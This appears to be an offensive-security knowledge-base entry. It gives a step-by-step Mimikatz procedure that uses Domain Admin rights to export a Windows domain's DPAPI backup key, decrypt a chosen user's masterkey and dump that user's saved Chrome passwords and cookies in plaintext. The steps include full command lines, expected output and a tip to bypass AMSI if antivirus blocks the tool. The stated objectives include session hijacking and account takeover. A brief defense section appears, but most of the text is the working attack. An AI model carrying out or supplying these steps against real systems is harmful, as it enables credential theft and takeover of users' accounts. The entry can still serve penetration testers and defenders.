---
type: procedure
tactics:
  - '[[Credential Access]]'
techniques:
  - '[[Credential Dumping]]'
  - '[[Credentials from Web Browsers]]'
sub_techniques: []
tags:
  - active-directory
  - chrome
  - credential-access
  - dpapi
commands:
  - '[[commands/mimikatz-export-domain-private-key]]'
  - '[[commands/wmic-list-users-by-name-and-sid]]'
  - '[[commands/mimikatz-attempt-chrome-extraction-to-reveal-guid]]'
  - '[[commands/mimikatz-decrypt-user-masterkey-with-domain-private-key]]'
  - '[[commands/mimikatz-extract-chrome-credentials-with-masterkey]]'
platforms:
  - Windows
tools:
  - '[[tools/Mimikatz]]'
skill_level: advanced
impact_level: high
detection_risk: high
verified: true
validated: true
---

# Extract-Chrome-Cookies-and-Credentials-from-User-Profile-with-Domain-Admin

## Summary

This procedure enables the extraction of encrypted Chrome browser cookies and credentials from a domain user's profile by leveraging Domain Administrator privileges to export the domain's private key and decrypt the user's DPAPI masterkey. It targets Chrome's storage of sensitive data in SQLite databases protected by DPAPI, allowing offline decryption of saved passwords, cookies, and other web credentials for potential lateral movement or privilege escalation in Active Directory environments.

## Description

Chrome stores user credentials and cookies in encrypted SQLite databases located in the user's AppData directory, protected by Windows DPAPI using a masterkey tied to the user's profile. For domain users, this masterkey can be further protected by domain-level keys. With Domain Admin access, an attacker can use Mimikatz to backup the domain's private keys from the Domain Controller, then use those keys to decrypt any domain user's masterkey. Once decrypted, the Chrome data can be unprotected to reveal plaintext credentials. This technique is useful in post-exploitation scenarios where physical or remote access to a user's machine is available, and it requires elevated privileges on a Domain Controller to initiate the key export. The process involves failing an initial extraction to identify the masterkey GUID, locating the protected key file, decrypting it, and finally extracting the data.

## Requirements

1. Domain Administrator privileges on a Domain Controller to export private keys.
2. Administrative access to the target user's machine to access Chrome data files.
3. Mimikatz tool installed or copied to the target system (x64 version recommended for Windows 10+).
4. Knowledge of the target user's SID and username.
5. Target environment: Windows domain-joined machine with Google Chrome installed and user data present.

## Defense

- Enable Credential Guard and LSA protection to prevent DPAPI masterkey extraction.
- Monitor for Mimikatz execution via process creation (e.g., suspicious lsadump or dpapi modules) using EDR tools like Sysmon or Windows Defender.
- Restrict Domain Admin logons to Domain Controllers only and audit key backup operations in Event Logs (Event ID 4656 for LSA secrets access).
- Use browser policies to disable password saving and enforce multi-factor authentication for web services.
- Regularly rotate domain backup keys and implement just-in-time admin privileges.

## Objectives

1. Export the domain's private key to enable masterkey decryption for any domain user.
2. Identify and decrypt the target user's DPAPI masterkey using the domain private key.
3. Extract and decrypt Chrome-stored credentials and cookies in plaintext for reuse.
4. Obtain sensitive web login information for further attacks like session hijacking or account takeover.

## Instructions

### Step 1: Export Domain Private Key

**Context**: Begin by exporting the domain's private keys from the LSA using Mimikatz on a Domain Controller. This requires Domain Admin privileges and provides the RSA private key (.pvk file) needed for subsequent decryptions. The command targets the system hive on the DC and exports keys to the current directory.

**Command** ([[commands/mimikatz-export-domain-private-key]]):
```command_prompt
mimikatz.exe "lsadump::backupkeys /system:$_DOMAIN_CONTROLLER.$_DOMAIN /export" "exit"
```

> This command will output multiple key files, including the current preferred RSA key (e.g., ntds_capi_0_{GUID}.keyx.rsa.pvk). Success is indicated by 'Private export: OK' messages. Note the .pvk file for later use. If antivirus blocks Mimikatz, run from an elevated prompt with AMSI bypass if needed.

### Step 2: Enumerate Target User SID

**Context**: Obtain the Security Identifier (SID) for the target user to locate their protected masterkey files. This step uses built-in WMIC to list all user accounts and their SIDs without requiring additional tools.

**Command** ([[commands/wmic-list-users-by-name-and-sid]]):
```command_prompt
wmic.exe useraccount get name,sid
```

> The output lists usernames and corresponding SIDs (e.g., S-1-5-21-...-1108 for user 'bob'). Identify and note the SID for the target domain user. This is essential for constructing the path to the masterkey.

### Step 3: Attempt Chrome Extraction to Reveal Masterkey GUID

**Context**: Run a DPAPI Chrome extraction command on the target user's Login Data file as Administrator. This will fail due to domain protection but will reveal the GUID of the protecting masterkey in the error output, which is needed to locate the exact masterkey file.

**Command** ([[commands/mimikatz-attempt-chrome-extraction-to-reveal-guid]]):
```command_prompt
mimikatz.exe "dpapi::chrome /in:"""C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User Data\Default\Login Data""" /unprotect" "exit"
```

> Expected failure output includes a line like 'volatile cache: GUID:{84dcc2cc-82c6-44d4-9404-45fd48b4b650};KeyHash:...'. Extract the GUID (e.g., {84dcc2cc-82c6-44d4-9404-45fd48b4b650}) from this. If Chrome is not running, close it first to avoid database locks. Repeat for Cookies file if targeting cookies specifically (path: ...\Default\Cookies).

### Step 4: Decrypt User Masterkey with Domain Private Key

**Context**: Use the identified GUID and SID to locate the masterkey file (typically at C:\Users\$_TARGET_USER\AppData\Roaming\Microsoft\Protect\$_USER_SID\$_GUID), then decrypt it using Mimikatz and the exported domain private key. This yields the masterkey value required for Chrome data decryption.

**Command** ([[commands/mimikatz-decrypt-user-masterkey-with-domain-private-key]]):
```command_prompt
mimikatz.exe dpapi::masterkey /in:"C:\Users\$_TARGET_USER\AppData\Roaming\Microsoft\Protect\$_USER_SID\$_GUID" /pvk:$_DOMAIN_PRIVATE_KEY_FILE.pvk
```

> Run this from the Mimikatz interactive prompt for easier quote handling. Success outputs the [masterkey] section with pbKey value (e.g., a long hex string like b261bb57fdf57581...). Copy this pbKey as $_MASTER_KEY for the next step. The command decrypts using the domainkey section.

### Step 5: Extract Chrome Credentials Using Masterkey

**Context**: With the decrypted masterkey, perform the final extraction on the Chrome Login Data file. This decrypts the AES-256-GCM protected entries to reveal URLs, usernames, and passwords in plaintext.

**Command** ([[commands/mimikatz-extract-chrome-credentials-with-masterkey]]):
```command_prompt
mimikatz.exe dpapi::chrome /in:"C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect /masterkey:$_MASTER_KEY
```

> Again, use the interactive Mimikatz prompt. Expected output includes lines like 'URL: http://example.com', 'Username: user', 'Password: pass'. For cookies, replace the /in path with the Cookies file and use /complete for full details. Export results to a file if needed for analysis.
